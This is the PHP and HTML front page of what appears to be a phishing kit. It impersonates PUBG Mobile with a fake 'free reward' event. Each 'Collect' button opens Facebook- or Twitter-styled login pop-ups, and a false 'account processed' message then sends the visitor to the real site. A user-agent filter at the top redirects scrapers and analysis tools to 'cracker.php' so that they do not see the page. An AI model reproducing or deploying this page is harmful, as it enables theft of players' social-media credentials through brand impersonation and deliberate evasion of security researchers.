<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
include("system/setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<style type="text/css">
#collect fieldset:not(:first-of-type) {
display: none;
}
.popup-login {
	background:rgba(0,0,0,0.5);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
}
.popup-box-login-fb {
	background:#ECEFF6;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:1.9%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-twitter {
	background:#fff;
	max-width:330px;
	height:350px;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.close-fb {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	position:absolute;
	top:-8px;
	right:-10px;
	display:block;
}
.close-fb i {
	color:#fff;
	padding-top:1px;
}
.close-other {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	top:-8px;
	right:-10px;
	position:absolute;
	z-index:9999999;
	display:block;
}
.close-other i {
	color:#fff;
	padding-top:1px;
}
@media only screen and (max-width:600px) {
	.popup-box-login-fb {
		margin-top: 4%;
	}
}
</style>
  

<div class="container">
<div style="background: #000; width: 100%; height: 50px; border-bottom: 1px solid #eaa300;">
<img style="width: 35px; float: left; margin-top: 7px; margin-left: 10px; border-radius: 5px;" src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<div style="margin-left: 6px; margin-top: 5px; color: #eaa300; font-size: 17px; font-family: Teko; text-align: left; text-transform: uppercase; float: left;">
PUBG MOBILE
</br>
<span style="color: #fff; line-height: 10px;">Official PUBG Mobile</span>
</div>
<div style="width: auto; margin-top: -7px; margin-right: 12px; float: right;">
<button type="button" style="background: #eaa300; width: auto; height: auto; margin-top: 17px; padding: 3px; padding-left: 7px; padding-right: 7px; color: #000; font-size: 15px; font-family: Teko; text-align: center; text-transform: uppercase; border:1px solid #ffcc57; border-radius: 1px;">Purchase</button>
<button type="button" style="background: #eaa300; width: auto; height: auto; margin-top: 17px; padding: 3px; padding-left: 7px; padding-right: 7px; color: #000; font-size: 15px; font-family: Teko; text-align: center; text-transform: uppercase; border:1px solid #ffcc57; border-radius: 1px;">Download</button>
</div>
</div>
<div class="header"></div>

<div class="box">
<center>
<div class="menu-wrapper-border"></div>
<div class="menu-wrapper">
<div class="menu-content tengah" onmousedown="buka.play();" onclick="openRewards(event, 'latest');" id="defaultTabRewards">Latest Reward</div>

<div class="alert-wrapper">
		<div class="alert">
			<div class="alert-time">
				<div id="timer1"></div>
			</div>
			<div class="slider animated fadeIn">Welcome to Silvanus X-Suit Event</div>
			<div class="slider animated fadeIn">Collect your free reward just today</div>
		</div>
		</div>
</center>

<div id="latest" class="gallery">
<div class="scroll">
<center>
<div class="item itemShine">
<figure>
<img src="img/reward/1.png">
</figure>
<div>
<button style="border-top: 0px;" onmousedown="buka.play();" onclick="open_login();">Collect</button>
</div>
</div>
<div class="item itemShine">
<figure>
<img src="img/reward/2.png">
</figure>
<div>
<button style="border-top: 0px;" onmousedown="buka.play();" onclick="open_login();">Collect</button>
</div>
</div>
<div class="item itemShine">
<figure>
<img src="img/reward/3.png">
</figure>
<div>
<button style="border-top: 0px;" onmousedown="buka.play();" onclick="open_login();">Collect</button>
</div>
</div>
<div class="item itemShine">
<figure>
<img src="img/reward/4.png">
</figure>
<div>
<button style="border-top: 0px;" onmousedown="buka.play();" onclick="open_login();">Collect</button>
</div>
</div>
<div class="item itemShine">
<figure>
<img src="img/reward/5.png">
</figure>
<div>
<button style="border-top: 0px;" onmousedown="buka.play();" onclick="open_login();">Collect</button>
</div>
</div>
<div class="item itemShine">
<figure>
<img src="img/reward/6.png">
</figure>
<div>
<button style="border-top: 0px;" onmousedown="buka.play();" onclick="open_login();">Collect</button>
</div>
</div>
</center>
</div> <!--- scroll --->
</div> <!--- tab-rewards --->
<div class="footer">
<img src="img/footer_img.png">
<div class="footer-txt">&copy; 2018-2022 PUBG CORPORATION. All rights reserved.</div>
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup reward_confirmation">
<div class="popup-box">
<div class="popup-box-bg">
<div class="popup-box-title">Processing Account</div> <!--- popup-box-title --->
<div class="popup-alert">
Thank you for joining this event
<br>
Your account has been successfully processed
<br>
Please wait up to 24 hours
</div> <!--- popup-alert --->
<button type="button" class="popup-box-btn" onmousedown="buka.play();" onclick="location.href='https://pubgmobile.com/';">Logout</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<!--- fieldset content --->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<!--- /fieldset content --->
<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script src="js/timer.js"></script>
<script src="js/tab.js"></script>
<script src="js/popup.js"></script>
<script src="js/fieldset.js"></script>
<script src="js/slider.js"></script>
<script src="js/click.js"></script>

</body>
</html>